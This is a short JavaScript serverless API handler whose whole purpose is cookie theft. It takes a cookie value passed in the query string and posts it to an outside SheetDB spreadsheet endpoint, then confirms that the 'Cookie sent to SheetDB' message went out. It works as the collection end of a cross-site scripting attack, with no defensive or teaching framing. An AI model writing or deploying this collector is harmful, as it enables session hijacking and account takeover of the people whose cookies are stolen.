export default async function handler(req, res) {
  const cookie = req.query.c || "no-cookie";

  try {
    await fetch("https://sheetdb.io/api/v1/52j1sx3wjdti6", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        data: [{ indusdata: cookie }]
      })
    });

    res.status(200).send("Cookie sent to SheetDB");
  } catch (err) {
    res.status(500).send("Error: " + err.message);
  }
}
